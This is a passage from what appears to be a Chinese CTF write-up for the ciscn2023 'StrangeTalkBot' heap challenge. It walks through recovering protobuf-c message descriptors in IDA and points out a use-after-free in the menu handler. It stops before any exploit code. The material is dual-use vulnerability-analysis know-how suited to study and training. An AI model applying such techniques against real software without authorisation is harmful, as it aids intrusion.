class="headerlink" title="ida结构体"></a>ida结构体</h3><p>为了方便在ida中查看相关结构体,可以将上述的两个结构体插入ida,当然需要处理一些不相关的数据</p><p><strong>ProtobufCMessageDescriptor</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessageDescriptor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint32_t</span> magic;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *short_name;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *c_name;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *package_name;</span><br><span class="line">  <span class="type">size_t</span> sizeof_message;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n_fields;</span><br><span class="line">  <span class="type">const</span> ProtobufCFieldDescriptor *fields;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> *fields_sorted_by_name;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n_field_ranges;</span><br><span class="line">  <span class="type">char</span> *field_ranges;</span><br><span class="line">  __int64 message_init;</span><br><span class="line">  <span class="type">void</span> *reserved1;</span><br><span class="line">  <span class="type">void</span> *reserved2;</span><br><span class="line">  <span class="type">void</span> *reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>ProtobufCFieldDescriptor</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">uint32_t</span> id;</span><br><span class="line">  <span class="type">int</span> label;</span><br><span class="line">  <span class="type">int</span> type;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> quantifier_offset;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *descriptor;</span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *default_value;</span><br><span class="line">  <span class="type">uint32_t</span> flags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> reserved_flags;</span><br><span class="line">  <span class="type">void</span> *reserved2;</span><br><span class="line">  <span class="type">void</span> *reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="ciscn2023-StrangeTalkBot"><a href="#ciscn2023-StrangeTalkBot" class="headerlink" title="ciscn2023-StrangeTalkBot"></a>ciscn2023-StrangeTalkBot</h2><p>程序主流程十分清晰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> v3; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_1763(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;unk_A060, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can try to have friendly communication with me now: &quot;</span>);</span><br><span class="line">    v3 = read(<span class="number">0</span>, &amp;unk_A060, <span class="number">0x400</span>uLL);</span><br><span class="line">    v4 = (_QWORD *)sub_192D(<span class="number">0LL</span>, v3, &amp;unk_A060);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_155D(v4[<span class="number">3</span>], v4[<span class="number">4</span>], v4[<span class="number">5</span>], v4[<span class="number">6</span>], v4[<span class="number">7</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_1329();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有沙盒不能getshell</p><p><code>sub_155D</code>是一个很明显的菜单堆,漏洞也很清晰就是一个uaf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_155D</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2, <span class="type">unsigned</span> __int64 a3, <span class="type">unsigned</span> __int64 a4, __int64 a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt;= <span class="number">0x21</span> )</span><br><span class="line">    sub_1329();</span><br><span class="line">  <span class="keyword">if</span> ( a4 &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    sub_1329();</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    sub_1329();</span><br><span class="line">  <span class="keyword">if</span> ( (__int64)a3 &lt; (__int64)a4 )</span><br><span class="line">    v6 = a4;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_14FC(a2);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_148A(a2);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_1347(a2, v6, a4, a5);</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">2</span> )</span><br><span class="line">LABEL_19:</span><br><span class="line">    sub_1329();</span><br><span class="line">  <span class="keyword">return</span> sub_13EF(a2, a4, a5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键在于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v4 = (_QWORD *)sub_192D(<span class="number">0LL</span>, v3, &amp;unk_A060);</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_192D</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_5090(&amp;unk_9C80, a1, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个格式是不是很像protobuf的解包函数</p><p>以及结合我们在字符串中发现的一些字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000000074E000000022CBINARYBF_c_service_generated_init</span><br><span class="line">.rodata:000000000000752000000023CBINARYBF_c_service_invoke_internal</span><br><span class="line">.rodata:000000000000756000000021CBINARYBF_c_message_free_unpacked</span><br><span class="line">.rodata:00000000000075900000001DCparse_packed_repeated_member</span><br><span class="line">.rodata:00000000000075B00000000DCparse_member</span><br><span class="line">.rodata:00000000000075C00000001ACBINARYBF_c_message_unpack</span><br><span class="line">.rodata:00000000000075E00000001BCpack_buffer_packed_payload</span><br><span class="line">.rodata:00000000000076000000001ACget_packed_payload_length</span><br><span class="line">.rodata:00000000000076200000001ECrepeated_field_pack_to_buffer</span><br><span class="line">.rodata:00000000000076400000001ECrequired_field_pack_to_buffer</span><br><span class="line">.rodata:000000000000766000000022CBINARYBF_c_message_pack_to_buffer</span><br><span class="line">.rodata:00000000000076900000001DCsizeof_elt_in_repeated_array</span><br><span class="line">.rodata:00000000000076B000000014Crepeated_field_pack</span><br><span class="line">.rodata:00000000000076D000000014Crequired_field_pack</span><br><span class="line">.rodata:00000000000076F000000018CBINARYBF_c_message_pack</span><br><span class="line">.rodata:00000000000077100000001FCrequired_field_get_packed_size</span><br><span class="line">.rodata:000000000000774000000023CBINARYBF_c_message_get_packed_size</span><br><span class="line">.rodata:000000000000776400000018CBINARYBF-c/BINARYBF-c.c</span><br><span class="line">.rodata:000000000000777E00000006C1.4.1</span><br><span class="line">.rodata:000000000000778400000013Ctmp == payload_len</span><br><span class="line">.rodata:000000000000779700000017Crv-&gt;descriptor != NULL</span><br><span class="line">.rodata:00000000000077B00000002ECmethod_index &lt; service-&gt;descriptor-&gt;n_methods</span><br><span class="line">.rodata:00000000000077E000000047C((message)-&gt;descriptor)-&gt;magic == BINARYBF_C__MESSAGE_DESCRIPTOR_MAGIC</span><br><span class="line">.rodata:00000000000078280000002ACactual_length_size == length_size_min + 1</span><br><span class="line">.rodata:000000000000785800000036C(desc)-&gt;magic == BINARYBF_C__MESSAGE_DESCRIPTOR_MAGIC</span><br><span class="line">.rodata:00000000000078900000003CC(descriptor)-&gt;magic == BINARYBF_C__SERVICE_DESCRIPTOR_MAGIC</span><br></pre></td></tr></table></figure><p>基本能够确定这是protobuf的unpack函数,版本是1.4.1</p><p>那么逆向的关键其实就是在<code>&amp;unk_9C80</code>了</p><p>很显然这是一个<code>ProtobufCMessageDescriptor</code>对象</p><p>我们只需要在ida中手动添加一下结构体(一些不重要的类型直接用大小相等的数据类型替代)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> ; Ins/Del : create/delete structure</span><br><span class="line"><span class="number">00000000</span> ; D/A<span class="comment">/*   : create structure member (data/ascii/array)</span></span><br><span class="line"><span class="comment">00000000 ; N       : rename structure or structure member</span></span><br><span class="line"><span class="comment">00000000 ; U       : delete structure member</span></span><br><span class="line"><span class="comment">00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Sym. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"><span class="comment">00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Rela. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"><span class="comment">00000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Dyn. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"><span class="comment">00000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Verneed. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"><span class="comment">00000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Vernaux. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"><span class="comment">00000000 ; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">00000000</span></span><br><span class="line"><span class="comment">00000000 ProtobufCMessageDescriptor struc ; (sizeof=0x78, align=0x8, copyof_19)</span></span><br><span class="line"><span class="comment">00000000                                         ; XREF: .data.rel.ro:stru_9C80/r</span></span><br><span class="line"><span class="comment">00000000 magic dd ?</span></span><br><span class="line"><span class="comment">00000004 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000005 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000006 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000007 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000008 name dq ?                               ; offset</span></span><br><span class="line"><span class="comment">00000010 short_name dq ?                         ; offset</span></span><br><span class="line"><span class="comment">00000018 c_name dq ?                             ; offset</span></span><br><span class="line"><span class="comment">00000020 package_name dq ?                       ; offset</span></span><br><span class="line"><span class="comment">00000028 sizeof_message dq ?</span></span><br><span class="line"><span class="comment">00000030 n_fields dd ?</span></span><br><span class="line"><span class="comment">00000034 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000035 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000036 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000037 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000038 fields dq ?                             ; offset</span></span><br><span class="line"><span class="comment">00000040 fields_sorted_by_name dq ?              ; offset</span></span><br><span class="line"><span class="comment">00000048 n_field_ranges dd ?</span></span><br><span class="line"><span class="comment">0000004C db ? ; undefined</span></span><br><span class="line"><span class="comment">0000004D db ? ; undefined</span></span><br><span class="line"><span class="comment">0000004E db ? ; undefined</span></span><br><span class="line"><span class="comment">0000004F db ? ; undefined</span></span><br><span class="line"><span class="comment">00000050 field_ranges dq ?                       ; offset</span></span><br><span class="line"><span class="comment">00000058 message_init dq ?                       ; offset</span></span><br><span class="line"><span class="comment">00000060 reserved1 dq ?                          ; offset</span></span><br><span class="line"><span class="comment">00000068 reserved2 dq ?                          ; offset</span></span><br><span class="line"><span class="comment">00000070 reserved3 dq ?                          ; offset</span></span><br><span class="line"><span class="comment">00000078 ProtobufCMessageDescriptor ends</span></span><br><span class="line"><span class="comment">00000078</span></span><br><span class="line"><span class="comment">00000000 ; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">00000000</span></span><br><span class="line"><span class="comment">00000000 ProtobufCFieldDescriptor struc ; (sizeof=0x48, align=0x8, copyof_18)</span></span><br><span class="line"><span class="comment">00000000 name dq ?                               ; offset</span></span><br><span class="line"><span class="comment">00000008 id dd ?</span></span><br><span class="line"><span class="comment">0000000C label dd ?</span></span><br><span class="line"><span class="comment">00000010 type dd ?</span></span><br><span class="line"><span class="comment">00000014 quantifier_offset dd ?</span></span><br><span class="line"><span class="comment">00000018 offset dd ?</span></span><br><span class="line"><span class="comment">0000001C db ? ; undefined</span></span><br><span class="line"><span class="comment">0000001D db ? ; undefined</span></span><br><span class="line"><span class="comment">0000001E db ? ; undefined</span></span><br><span class="line"><span class="comment">0000001F db ? ; undefined</span></span><br><span class="line"><span class="comment">00000020 descriptor dq ?                         ; offset</span></span><br><span class="line"><span class="comment">00000028 default_value dq ?                      ; offset</span></span><br><span class="line"><span class="comment">00000030 flags dd ?</span></span><br><span class="line"><span class="comment">00000034 reserved_flags dd ?</span></span><br><span class="line"><span class="comment">00000038 reserved2 dq ?                          ; offset</span></span><br><span class="line"><span class="comment">00000040 reserved3 dq ?                          ; offset</span></span><br><span class="line"><span class="comment">00000048 ProtobufCFieldDescriptor ends</span></span><br><span class="line"><span class="comment">00000048</span></span><br></pre></td></tr></table></figure><p>这样看起来就舒服多了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000009C80                               ; struct ProtobufCMessageDescriptor stru_9C80</span><br><span class="line">.data.rel.ro:0000000000009C80 F9 EE AA 28 00 00 00 00 D0 70+stru_9C80 dd 28AAEEF9h                            ; magic</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 DA 70 00 00+                                        ; DATA XREF: sub_185D+53↑o</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 DA 70 00 00 00 00+                                        ; sub_192D+27↑o</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 E4 70 00 00 00 00 00 00+                                        ; .data.rel.ro:0000000000009D00↓o</span><br><span class="line">.data.rel.ro:0000000000009C80 40 00 00 00 00 00 00 00 04 00+db 4 dup(0)                             ; &quot;devicemsg&quot; ...</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 60 9B 00 00+dq offset aDevicemsg                    ; name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 B0 70 00 00 00 00+dq offset aDevicemsg_0                  ; short_name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 01 00 00 00 00 00 00 00+dq offset aDevicemsg_0                  ; c_name</span><br><span class="line">.data.rel.ro:0000000000009C80 C0 70 00 00 00 00 00 00 5D 18+dq offset unk_70E4                      ; package_name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00+dq 40h                                  ; sizeof_message</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00+dd 4                                    ; n_fields</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00 db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset stru_9B60                     ; fields</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset unk_70B0                      ; fields_sorted_by_name</span><br><span class="line">.data.rel.ro:0000000000009C80                               dd 1                                    ; n_field_ranges</span><br><span class="line">.data.rel.ro:0000000000009C80                               db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset unk_70C0                      ; field_ranges</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset sub_185D                      ; message_init</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved1</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved3</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000009B60 80 70 00 00 00 00 00 00 01 00+stru_9B60 dq offset aActionid                     ; name</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 04 00 00 00+                                        ; DATA XREF: .data.rel.ro:stru_9C80↓o</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 18 00 00 00 00 00+dd 1                                    ; id ; &quot;actionid&quot;</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 00 00 00 00+dd 0                                    ; label</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 00 00 00 00+dd 4                                    ; type</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 00 00 00 00+dd 0                                    ; quantifier_offset</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 00 00 00 00+dd 18h                                  ; offset</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00                         db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009B60                               dq 0                                    ; descriptor</span><br><span class="line">.data.rel.ro:0000000000009B60                               dq 0                                    ; default_value</span><br><span class="line">.data.rel.ro:0000000000009B60                               dd 0                                    ; flags</span><br><span class="line">.data.rel.ro:0000000000009B60                               dd 0                                    ; reserved_flags</span><br><span class="line">.data.rel.ro:0000000000009B60                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009B60                               dq 0                                    ; reserved3</span><br><span class="line">.data.rel.ro:0000000000009BA8 89 70 00 00 00 00 00 00 02 00+dq offset aMsgidx                       ; name ; &quot;msgidx&quot;</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 00 00 04 00 00 00+dd 2                                    ; id</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 20 00 00 00 00 00+dd 0                                    ; label</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 00 00 00 00 00 00+dd 4                                    ; type</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 00 00 00 00 00 00+dd 0                                    ; quantifier_offset</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 00 00 00 00 00 00+dd 20h                                  ; offset</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 00 00 00 00 00 00+db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00                         dq 0                                    ; descriptor</span><br><span class="line">.data.rel.ro:0000000000009BA8                               dq 0                                    ; default_value</span><br><span class="line">.data.rel.ro:0000000000009BA8                               dd 0                                    ; flags</span><br><span class="line">.data.rel.ro:0000000000009BA8                               dd 0                                    ; reserved_flags</span><br><span class="line">.data.rel.ro:0000000000009BA8                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009BA8                               dq 0                                    ; reserved3</span><br><span class="line">.data.rel.ro:0000000000009BF0 90 70 00 00 00 00 00 00 03 00+dq offset aMsgsize                      ; name ; &quot;msgsize&quot;</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 00 00 04 00 00 00+dd 3                                    ; id</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 28 00 00 00 00 00+dd 0                                    ; label</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 00 00 00 00 00 00+dd 4                                    ; type</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 00 00 00 00 00 00+dd 0                                    ; quantifier_offset</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 00 00 00 00 00 00+dd 28h                                  ; offset</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 00 00 00 00 00 00+db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00                         dq 0                                    ; descriptor</span><br><span class="line">.data.rel.ro:0000000000009BF0                               dq 0                                    ; default_value</span><br><span class="line">.data.rel.ro:0000000000009BF0                               dd 0                                    ; flags</span><br><span class="line">.data.rel.ro:0000000000009BF0                               dd 0                                    ; reserved_flags</span><br><span class="line">.data.rel.ro:0000000000009BF0                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009BF0                               dq 0                                    ; reserved3</span><br><span class="line">.data.rel.ro:0000000000009C38 98 70 00 00 00 00 00 00 04 00+dq offset aMsgcontent                   ; name ; &quot;msgcontent&quot;</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 00 00 0F 00 00 00+dd 4                                    ; id</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 30 00 00 00 00 00+dd 0                                    ; label</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 00 00 00 00 00 00+dd 0Fh                                  ; type</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 00 00 00 00 00 00+dd 0                                    ; quantifier_offset</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 00 00 00 00 00 00+dd 30h                                  ; offset</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 00 00 00 00 00 00+db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00                         dq 0                                    ; descriptor</span><br><span class="line">.data.rel.ro:0000000000009C38                               dq 0                                    ; default_value</span><br><span class="line">.data.rel.ro:0000000000009C38                               dd 0                                    ; flags</span><br><span class="line">.data.rel.ro:0000000000009C38                               dd 0                                    ; reserved_flags</span><br><span class="line">.data.rel.ro:0000000000009C38                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009C38                               dq 0                                    ; reserved3</span><br><span class="line">.data.rel.ro:0000000000009C80                               ; struct ProtobufCMessageDescriptor stru_9C80</span><br><span class="line">.data.rel.ro:0000000000009C80 F9 EE AA 28 00 00 00 00 D0 70+stru_9C80 dd 28AAEEF9h                            ; magic</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 DA 70 00 00+                                        ; DATA XREF: sub_185D+53↑o</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 DA 70 00 00 00 00+                                        ; sub_192D+27↑o</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 E4 70 00 00 00 00 00 00+                                        ; .data.rel.ro:0000000000009D00↓o</span><br><span class="line">.data.rel.ro:0000000000009C80 40 00 00 00 00 00 00 00 04 00+db 4 dup(0)                             ; &quot;devicemsg&quot; ...</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 60 9B 00 00+dq offset aDevicemsg                    ; name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 B0 70 00 00 00 00+dq offset aDevicemsg_0                  ; short_name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 01 00 00 00 00 00 00 00+dq offset aDevicemsg_0                  ; c_name</span><br><span 